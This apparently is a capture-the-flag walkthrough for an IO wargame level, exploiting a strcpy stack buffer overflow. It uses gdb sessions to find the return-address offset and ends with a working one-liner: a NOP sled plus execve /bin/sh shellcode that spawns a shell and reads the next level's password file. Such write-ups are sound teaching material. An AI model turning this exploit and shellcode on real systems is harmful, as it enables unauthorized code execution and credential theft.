Let's check out the source code for this level:
```
#include <stdio.h>
#include <string.h>

int main(int argc, char **argv) {

    char buf[128];

    if(argc < 2) return 1;

    strcpy(buf, argv[1]);

    printf("%s\n", buf);

    return 0;
}
```

This looks like a classic buffer overflow, only there's no function in the source code we can jump to that will give us a shell as level6. We'll have to supply our own shellcode this time to make it work. First we need to find how large of a buffer we need to overwrite the return address.
```
level5@io:/levels$ gdb -q level05
Reading symbols from /levels/level05...done.
(gdb) run $(python -c 'print "A"*140')
Starting program: /levels/level05 $(python -c 'print "A"*140')
AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA

Program received signal SIGSEGV, Segmentation fault.
0xb7e98416 in _setjmp () from /lib/i386-linux-gnu/i686/cmov/libc.so.6
(gdb) run $(python -c 'print "A"*160')
The program being debugged has been started already.
Start it from the beginning? (y or n) y

Starting program: /levels/level05 $(python -c 'print "A"*160')
AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA

Program received signal SIGSEGV, Segmentation fault.
0x41414141 in ?? ()
```

So it looks like 160 bytes was enough. Now we need to find the exact size.
```
(gdb) run $(python -c 'print "A"*148')
The program being debugged has been started already.
Start it from the beginning? (y or n) y

Starting program: /levels/level05 $(python -c 'print "A"*144')
AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA

Program received signal SIGSEGV, Segmentation fault.
0x41414141 in ?? ()
(gdb) run $(python -c 'print "A"*140 + "BBBB"')
The program being debugged has been started already.
Start it from the beginning? (y or n) y

Starting program: /levels/level05 $(python -c 'print "A"*140 + "BBBB"')
AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAABBBB

Program received signal SIGSEGV, Segmentation fault.
0x42424242 in ?? ()
```

Now that we know how far to overwrite, let's try to see what registers point to our buffer.
```
(gdb) x/20xw $esp
0xbffffc30: 0x00000000  0xbffffcd4  0xbffffce0  0xb7fe0860
0xbffffc40: 0xb7ff6821  0x0177ff8e  0xb7ffeff4  0x0804820b
0xbffffc50: 0x00000001  0xbffffc90  0xb7fefc16  0xb7fffac0
0xbffffc60: 0xb7fe0b58  0xb7fceff4  0x00000000  0x00000000
0xbffffc70: 0xbffffca8  0xb77a6ac5  0x981e1cd5  0x00000000
(gdb) x/20xw $eax
0x0:    Cannot access memory at address 0x0
(gdb) x/20xw $ebx
0xb7fceff4: 0x00160d7c  0xb7fe0860  0xb7ff59b0  0xb7e84c26
0xb7fcf004: 0xb7e84c36  0xb7e84c46  0xb7e84c56  0xb7e84c66
0xb7fcf014: 0xb7e84c76  0xb7ee35d0  0x00000000  0x00000000
0xb7fcf024 <__fpu_control>: 0x0000037f  0x00000022  0x00000040  0x00000000
0xb7fcf034: 0x00000000  0x00000000  0x00000000  0x00000003
(gdb) x/20xw $ecx
0xbffffb68: 0xb7fcf4e0  0x08048524  0xbffffb84  0xb7fceff4
0xbffffb78: 0xbffffc28  0x08048409  0x08048524  0xbffffba0
0xbffffb88: 0xb7ffeff4  0xbffffc80  0xb7fffac0  0xbffffc54
0xbffffb98: 0xb7feb662  0x00000000  0x41414141  0x41414141
0xbffffba8: 0x41414141  0x41414141  0x41414141  0x41414141
(gdb) x/20xw $edx
0xb7fd0360: 0x00000000  0x00000000  0x00000000  0x00000000
0xb7fd0370: 0x00000000  0x00000000  0x00000000  0x00000000
0xb7fd0380: 0x00000000  0x00000000  0x00000000  0x00000000
0xb7fd0390: 0x00000000  0x00000000  0x00000000  0x00000000
0xb7fd03a0 <__malloc_initialize_hook>:  0x00000000  0x00000000  0x00000000  0x00000000
(gdb) i r
eax            0x0  0
ecx            0xbffffb68   -1073743000
edx            0xb7fd0360   -1208155296
ebx            0xb7fceff4   -1208160268
esp            0xbffffc30   0xbffffc30
ebp            0x41414141   0x41414141
esi            0x0  0
edi            0x0  0
eip            0x42424242   0x42424242
eflags         0x10296  [ PF AF SF IF RF ]
cs             0x73 115
ss             0x7b 123
ds             0x7b 123
es             0x7b 123
fs             0x0  0
gs             0x33 51
```

It doesn't look like we have anything really promising, let's try increasing the buffer size after we overwrite the return address and see if we get anything better.
```
(gdb) run $(python -c 'print "A"*140 + "BBBB" + "C"*100')
The program being debugged has been started already.
Start it from the beginning? (y or n) y   

Starting program: /levels/level05 $(python -c 'print "A"*140 + "BBBB" + "C"*100')
AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAABBBBCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCC

Program received signal SIGSEGV, Segmentation fault.
0x42424242 in ?? ()
(gdb) x/20xw $esp
0xbffffbd0: 0x43434343  0x43434343  0x43434343  0x43434343
0xbffffbe0: 0x43434343  0x43434343  0x43434343  0x43434343
0xbffffbf0: 0x43434343  0x43434343  0x43434343  0x43434343
0xbffffc00: 0x43434343  0x43434343  0x43434343  0x43434343
0xbffffc10: 0x43434343  0x43434343  0x43434343  0x43434343
```

That looks much better! Now we just need to jump to esp after we overwrite the return address. Based on what we see, the stack moves around a bit so we might need to make use of a NOP sled. So let's make the buffer something like:
```
["A"*140][stack address]["\x90"*100][shellcode]
```

The goal is basically to overwrite the return address with an address that will always contain our buffer so we have a NOP sled of 100 bytes so we will most likely land in the middle of it. Following the NOP sled is the shellcode that we will run into. The shellcode is from [here](http://shell-storm.org/shellcode/files/shellcode-827.php) and gives us a shell. The solution is shown below:
```
level5@io:/levels$ ./level05 $(python -c 'print "A"*140 + "\x10\xfc\xff\xbf" + "\x90"*100 + "\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x50\x53\x89\xe1\xb0\x0b\xcd\x80"')

...

sh-4.2$ whoami
level6
sh-4.2$ cat /home/level6/.pass
[Password for level6]
```
